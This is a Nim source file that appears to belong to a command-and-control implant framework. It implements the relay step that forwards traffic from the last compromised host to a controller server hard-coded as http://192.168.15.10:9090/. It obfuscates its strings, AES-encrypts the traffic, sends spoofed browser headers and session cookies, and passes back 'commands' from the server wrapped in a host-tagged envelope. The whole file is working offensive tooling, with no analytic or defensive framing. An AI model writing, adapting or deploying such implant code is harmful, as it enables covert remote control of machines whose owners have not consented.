# Much like the main loop routine. It is used only by the relay system on
# the last host that forwards the request to the server. In most cases you
# can reuse the same communication logic as the main loop.
#
import std/json
import std/strutils
import std/tables

import ../../utils/global
import ../../utils/network/http as nhttp
import ../../utils/crypt/transport

var customServerHost = obf("http://192.168.15.10:9090/")

proc relayCookies(): Table[string, string] =
  # Builds the cookie table for the custom relay
  toTable([
    (obf("session"), obf("example")),
    (obf("token"), obf("example")),
  ])

proc relayHeaders(): Table[string, string] =
  # Builds the header table for the custom relay
  toTable([
    (obf("User-Agent"), obf("Mozilla/5.0")),
    (obf("X-Custom-Header"), obf("example")),
  ])

proc httpPost(
    url, payload: string;
    cookies: Table[string, string];
    headers: Table[string, string]
): tuple[code: uint16, body: string] =
  # Sends a post request with the cookies and headers
  var pairs: seq[(string, string)] = @[(obf("Connection"), obf("close"))]
  for key, value in headers:
    pairs.add((key, value))
  var cookieParts: seq[string] = @[]
  for key, value in cookies:
    cookieParts.add(key & obf("=") & value)
  if cookieParts.len > 0:
    pairs.add((obf("Cookie"), cookieParts.join(obf("; "))))
  let r = nhttp.winHttpPerform(url, "POST", payload, pairs)
  (code: r.code, body: r.body)

proc postEncrypted(plain: string): tuple[code: uint16, body: string] =
  # Encrypts the plain body and posts it to the custom server
  httpPost(
    customServerHost, cryptEncryptWithProbe(aesKey, plain), relayCookies(), relayHeaders())

proc decryptBody(cipher: string): string =
  # Decrypts the cipher body from the custom server
  tryCryptDecrypt(aesKey, cipher)

proc relayHttpCustomForwardDestiny*(_: JsonNode, contentBody: string): string =
  # Forwards the body to the custom server and returns the envelope
  if contentBody.len == 0:
    return ""
  try:
    let resp = postEncrypted(contentBody)
    if resp.body.len == 0:
      return ""
    let plain = decryptBody(resp.body)
    if plain.len == 0:
      return ""

    let parsed = parseJson(plain)
    var content = parsed
    if parsed.kind == JObject and parsed.hasKey(obf("commands")):
      content = parsed
    elif parsed.kind == JArray:
      var echoedOutput = false
      for item in parsed:
        if item.kind == JObject and item.hasKey(obf("option")) and
            item[obf("option")].getStr() == obf("output"):
          echoedOutput = true
          break
      if echoedOutput:
        content = %*{(obf("commands")): %*[]}
    elif parsed.kind == JObject and parsed.hasKey(obf("option")) and
        parsed[obf("option")].getStr() == obf("output"):
      content = %*{(obf("commands")): %*[]}

    result = $(%*{
      (obf("source")): hostTag,
      (obf("content")): content,
      (obf("chain")): %*[hostTag],
    })
  except JsonParsingError:
    result = ""
  except CatchableError:
    result = ""
